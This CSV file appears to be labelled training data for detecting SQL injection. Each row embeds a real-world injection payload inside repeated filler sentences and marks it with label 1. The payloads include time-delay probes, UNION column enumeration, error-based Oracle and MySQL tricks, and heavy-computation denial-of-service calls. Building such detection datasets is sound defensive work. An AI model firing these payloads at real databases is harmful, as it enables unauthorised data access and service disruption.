Query,Label
"tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj  "";begin dbms_lock.sleep(5); end and ""xouo"" like ""xouo tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj tfdbghj",1
"The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their 1);call regexp_substring(repeat(right(char(3702),0),500000000),null) The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their The bees decided to have a mutiny against their ",1
The best place to find a helping hand is at the end of your own The best place to find a helping hand is at the end of your own The best place to find a helping hand is at the end of your own The best place to find a helping hand is at the end of your own The best place to find a helping hand is at the end of your own The best place to find a helping hand is at the end of your own The best place to find a helping hand is at the end of your own The best place to find a helping hand is at the end of your own 5j9b7wn6xzbpyat64li1l9 belvxwr2fxwva9exrga7bfvyugaby2 vyapfccfsvvlwv0sl47bh kyryu uagyxqua4y0ydp7o ebwy0xhx2lcpg19ief21a6va3ulmam8f2josjxh hhkzidkzadrv0pgyk2eh6srb7xfpgcpgygftkcrrn0ixee5dt2uvpb1zz2gyd n68sks7s9yk65jyet9nh3pkjl42gfy4qcf frj9iufuj853o9h7k4z03r6r41csl66fdh20unzcp5e4yni1jfzpyiqhhqgv208iwpycdzlpa5 6wqdbrr0f04u96iyi2j 8 gozof1kby l4die5h1itnvw44bc6gs3wxnbtuk6z3f9jpdwvi75xmuu18istai4j2ydwc0n5 ded9ussqd3kv 9oa1u3f65klb7fo27aq6i6ydodk7fzpo7j4l06zqfu5 gs0llnp9opqrykejwl u2 8jp3mo4muu5v6emr53o zp44cf4q4pw4jz826v5opkh4zwgz330wugjvx4lykor7tsjn98hob1gwv093x33xi da-2679' ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'cutk' like 'cutk,1
"The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through The best way out is always through ""1')) or 8421=(select count(*) from generate_series(1 ""5000000)) and (('lqpd'='lqpd""""",1
The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy 1' and sleep(5) and 'kapr'='kapr The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy The best way to pay for a lovely moment is to enjoy ,1
The biggest adventure you can ever take is to live the life of your dreams. The bug was having an excellent day until he hit the windshield.The biggest adventure you can ever take is to live the life of your dreams. The bug was having an excellent day until he hit the windshield.The biggest adventure you  '));select (case when (3855=3855) then 3855 else 1/(select 0) end)-- can ever take is to live the life of your dreams. The bug was having an excellent day until he hit the windshield.The biggest adventure you can ever take is to live the life of your dreams. The bug was having an excellent day until he hit the windshield.The biggest adventure you can ever take is to live the life of your dreams. The bug was having an excellent day until he hit the windshield.The biggest adventure you can ever take is to live the life of your dreams. The bug was having an excellent day until he hit the windshield.The biggest adventure you can ever take is to live the life of your dreams. The bug was having an excellent day until he hit the windshield.The biggest adventure you can ever take is to live the life of your dreams. The bug was having an excellent day until he hit the windshield.The biggest adventure you can ever take is to live the life of your dreams. The bug was having an excellent day until he hit the windshield,1
The bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not graspThe bird of paradise alights only upon the hand that does not grasp) where 1193=1193 procedure analyse(extractvalue(9255 concat(0x5c (benchmark(5000000 md5(0x52515a50))))) 1)--,1
"The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected ""1%');select count(*) from generate_series(1 ""5000000) and ('%'='"""" The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected The body piercing didn't go exactly as he expected ",1
"The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield ""1')) union all select null null null ""null#"""" The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshield The bug was having an excellent day until he hit the windshiel",1
"The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had 1"" rlike sleep(5) The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had The changing of down comforters to cotton bedspreads always meant the squirrels had ",1
"The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile ""1'||(select 'adiv' from dual where 9842=9842 and 6055=ctxsys.drithsx.sn(6055 ""(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||'"""" The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile The day always looks brighter from behind a smile ",1
"The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky The day you decide to do it is your lucky 1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ('cpoy'='cpoy",1
"The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life ""-9569%')) union all select 8405 8405 8405 ""8405--"""" The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of life The energy of the mind is the essence of lif",1
"The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked  1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--   The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked The glacier came alive as the climbers hiked A man's dreams are an index to his A man's dreams are an index to his A man's dreams are an index to his A man's dreams are an index to his A man's dreams are an index to his A man's dreams are an index to his A man's dreams are an index to his A man's dreams are an index to his A man's dreams are an index to his ",1
"The golden retriever loved the fireworks each Fourth of JulyThe golden retriever loved the fireworks each Fourth of JulyThe golden retriever loved the fireworks each Fourth of JulyThe golden retriever loved the fireworks each Fourth of JulyThe golden retriever loved the fireworks each Fourth of JulyThe golden retriever loved the fireworks each Fourth of JulyThe golden retriever loved the fireworks each Fourth of JulyThe golden retriever loved the fireworks each Fourth of July ""-2500'))) union all select 6853 6853 6853 ""6853--"""" The golden retriever loved the fireworks each Fourth of July The golden retriever loved the fireworks each Fourth of July The golden retriever loved the fireworks each Fourth of July The golden retriever loved the fireworks each Fourth of July The golden retriever loved the fireworks each Fourth of July The golden retriever loved the fireworks each Fourth of July The golden retriever loved the fireworks each Fourth of July The golden retriever loved the fireworks each Fourth of July The golden retriever loved the fireworks each Fourth of July The golden retriever loved the fireworks each Fourth of Jul",1
"The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances The greatest part of our happiness depends on our dispositions not our circumstances  ""1%"""")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83) null) 0) 500000000) ""null)-",1
"The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay ""1';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101) ""5) from dual and 'fvda' like 'fvda"""" The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay The greatest remedy for anger is delay ",1
"The highest stage in moral ure at which we can arrive is when we recognize that we ought to control The highest stage in moral ure at which we can arrive is when we recognize that we ought to control The highest stage in moral ure at which we can arrive is when we recognize that we ought to control The highest stage in moral ure at which we can arrive is when we recognize that we ought to control The highest stage in moral ure at which we can arrive is when we recognize that we ought to control The highest stage in moral ure at which we can arrive is when we recognize that we ought to control The highest stage in moral ure at which we can arrive is when we recognize that we ought to control The highest stage in moral ure at which we can arrive is when we recognize that we ought to control -5771')) union all select 2833,2833,2833,2833,2833,2833-- The highest stage in moral ure at which we can arrive is when we recognize that we ought to control The highest stage in moral ure at which we can arrive is when we recognize that we ought to control The highest stage in moral ure at which we can arrive is when we recognize that we ought to control The highest stage in moral ure at which we can arrive is when we recognize that we ought to control ",1
"The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with 1') union all select null,null,null,null,null,null,null,null,null,null# The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with The only way to tell the truth is to speak with Someone is special only if you tell Someone is special only if you tell Someone is special only if you tell Someone is special only if you tell Someone is special only if you tell Someone is special only if you tell Someone is special only if you tell ",1
The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world 1%')));select sleep(5) and ((('%'=' The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world The overpass went under the highway and into a secret world ,1
The overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret )) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109) 5)-- worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret worldThe overpass went under the highway and into a secret world,1
The pessimist sees difficulty in every opportunity. The optimist sees the opportunity in every difficulty. The lake is a long way from here.The pessimist sees difficulty in every opportunity. The optimist sees the opportunity in every difficulty. The lake is a long way from here.The pessimist sees difficulty in every opportunity. The optimist sees the opportunity in every difficulty. The lake is a long way from here.The pessimist sees difficulty in every opportunity. The optimist sees the opportunity in every difficulty. The lake is a long way from here.The pessimist sees difficulty in every opportunity. '+(select dnxi where 5850=5850 or 8156=(select count(*) from generate_series(1 5000000))-- The optimist sees the opportunity in every difficulty. The lake is a long way from here.The pessimist sees difficulty in every opportunity. The optimist sees the opportunity in every difficulty. The lake is a long way from here.The pessimist sees difficulty in every opportunity. The optimist sees the opportunity in every difficulty. The lake is a long way from here.The pessimist sees difficulty in every opportunity. The optimist sees the opportunity in every difficulty. The lake is a long way from here.The pessimist sees difficulty in every opportunity. The optimist sees the opportunity in every difficulty. The lake is a long way from here.,1
The random sentence generator generated a random sentence about  The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence. a random sentence.))) or (select 2*(if((select * from (select concat(0x7171706a71 (select (elt(8113=8113 1))) 0x717a767a71 0x78))s)  8446744073709551610  8446744073709551610))) and (((7589=7589 The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence. random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence.The random sentence generator generated a random sentence about a random sentence,1
The road leading to a goal does not separate you from the destination; it is essentially a part of it. The road leading to a goal does not separate you from the destination; it is essentially a part of it.The road leading to a goal does not separate you from the destination; it is essentially a part of it. '+(select 'rpbx' where 6748=6748 and elt(4249=4249 7259))+' The road leading to a goal does not separate you from the destination; it is essentially a part of it.The road leading to a goal does not separate you from the destination; it is essentially a part of it. The road leading to a goal does not separate you from the destination; it is essentially a part of it.The road leading to a goal does not separate you from the destination; it is essentially a part of it. The road leading to a goal does not separate you from the destination; it is essentially a part of it.The road leading to a goal does not separate you from the destination; it is essentially a part of it. The road leading to a goal does not separate you from the destination; it is essentially a part of it.The road leading to a goal does not separate you from the destination; it is essentially a part of it. The road leading to a goal does not separate you from the destination; it is essentially a part of it.,1
"The secret ingredient to his wonderful life was crimeThe secret  "") union all select null null-- ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crimeThe secret ingredient to his wonderful life was crime",1
"The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my 1"" and (select * from (select(sleep(5)))fzno) and ""ssfu""=""ssfu The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my The sight of his goatee made me want to run and hide under my ",1
"The simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truestThe simplest things are often the truest ""1"""") as wehx where 5744=5744;select sleep(5)#""",1
"The steeper the mountain the harder the climb the better the view from the finishing line The steeper the mountain the harder the climb the better the view from the finishing line The steeper the mountain the harder the climb the better the view from the finishing line The steeper the mountain the harder the climb the better the view from the finishing line The steeper the mountain the harder the climb the better the view from the finishing line The steeper the mountain the harder the climb the better the view from the finishing line The steeper the mountain the harder the climb the better the view from the finishing line The steeper the mountain the harder the climb the better the view from the finishing line The steeper the mountain the harder the climb the better the view from the finishing line ""-7518"""" or elt(8413=3995 ""3995) and """"""""cpnf""""""""=""""""""cpnf"""" The steeper the mountain the harder the climb the better the view from the finishing line The steeper the mountain the harder the climb the better the view from the finishing line The steeper the mountain the harder the climb the better the view from the finishing line ",1
The sun had set and so had his dream The sun had set and so had his dream The sun had set and so had his dream The sun had set and so had his dream The sun had set and so had his dream The sun had set and so had his dream 1%') and sleep(5)# The sun had set and so had his dream The sun had set and so had his dream The sun had set and so had his dream The sun had set and so had his dream The sun had set and so had his dream The sun had set and so had his dream The sun had set and so had his dream The sun had set and so had his dream ,1
The teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered '+(select 'plcm' where 2141=2141 and elt(3114=3114 sleep(5))# what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school groundsThe teens wondered what was kept in the red shed on the far edge of the school grounds,1
"The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe 1"" where 3510=3510;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe The thing always happens that you really believe ",1
"The thunderous roar of the jet overhead confirmed her worst The thunderous roar of the jet overhead confirmed her worst The thunderous roar of the jet overhead confirmed her worst The thunderous roar of the jet overhead confirmed her worst The thunderous roar of the jet overhead confirmed her worst The thunderous roar of the jet overhead confirmed her worst The thunderous roar of the jet overhead confirmed her worst The thunderous roar of the jet overhead confirmed her worst 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' in boolean mode ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) -- The thunderous roar of the jet overhead confirmed her worst The thunderous roar of the jet overhead confirmed her worst ",1
"The toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being  "") as cysq where 5258=5258;select case when 1574=5523 then 1 else null end-- lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forestThe toy brought back fond memories of being lost in the rain forest",1
"The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it ""1')) as mxxd where 7255=7255 or 7552=(select count(*) from rdb$fields as t1 rdb$types as t2 rdb$collations as t3 ""rdb$functions as t4)--"""" The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on it The trick to getting kids to eat anything is to put catchup on i",1
"The two walked down the slot canyon oblivious to the sound of thunder in theThe two walked down the slot canyon oblivious to the sound of thunder in theThe two walked down the slot canyon oblivious to the sound of thunder in theThe two walked down the slot canyon oblivious to the sound of thunder in theThe two walked down the slot canyon oblivious to the sound of thunder in theThe two walked down the slot canyon oblivious to the sound of thunder in theThe two walked down the slot canyon oblivious to the sound of thunder in theThe two walked down the slot canyon oblivious to the sound of thunder in theThe two walked down the slot canyon oblivious to the sound of thunder in the1'+(select tdkt where 4535=4535;select benchmark(5000000,md5(0x4c4d6142)))+' The two walked down the slot canyon oblivious to the sound of thunder in theThe two walked down the slot canyon oblivious to the sound of thunder in the I begin with an idea and then it becomes something I begin with an idea and then it becomes something I begin with an idea and then it becomes something ",1
